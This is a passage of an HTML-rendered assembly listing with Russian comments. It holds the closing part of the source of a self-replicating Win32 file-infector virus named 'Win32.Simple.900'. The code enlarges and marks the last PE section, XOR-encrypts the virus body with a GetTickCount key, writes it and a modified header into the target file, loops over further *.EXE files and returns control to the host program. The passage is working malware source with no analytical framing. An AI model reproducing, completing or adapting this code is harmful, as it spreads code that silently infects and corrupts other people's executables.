</span><span class="sc1">;[Корректируем виртуальный и физический размеры последнего объекта]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем у последнего объекта атрибуты чтения/записи]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0000020h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем признак зараженности]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">


</span><span class="sc1">;[Получаем случайный ключ для шифровки]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetTickCount</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в буффер]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Virus</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">


</span><span class="sc1">;[Шифруем основное тело вируса в буффере]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">)+(</span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Loop2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">)+</span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">


</span><span class="sc1">;[Записываем код вируса в файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">


</span><span class="sc1">;[Записываем PE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HeaderOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeaderSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">


</span><span class="sc1">;[Записываем последний элемент таблицы объектов]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ObjectOfs</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ObjectSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Object</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">


</span><span class="sc1">;[Ищем следующий файл]</span><span class="sc0">

</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DTA</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление программе-носителю]</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RetAddr</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">RetAddr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                            ПОДПРОГРАММЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Seek</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Bytes</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallAPI</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">CallAPI</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">KernelAddr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">GetProcAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Win32.Simple.900 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">

</span><span class="sc5">DTASize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">13Eh</span><span class="sc0">
</span><span class="sc5">HeaderSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5Ch</span><span class="sc0">
</span><span class="sc5">ObjectSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc5">APINameSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">15</span><span class="sc0">

</span><span class="sc5">GetProcAddress</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FMask</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">HeaderOfs</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ObjectOfs</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Bytes</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Object</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">ObjectSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">HeaderSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">DTASize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CodeSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">VirSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span></div></body>
</html>
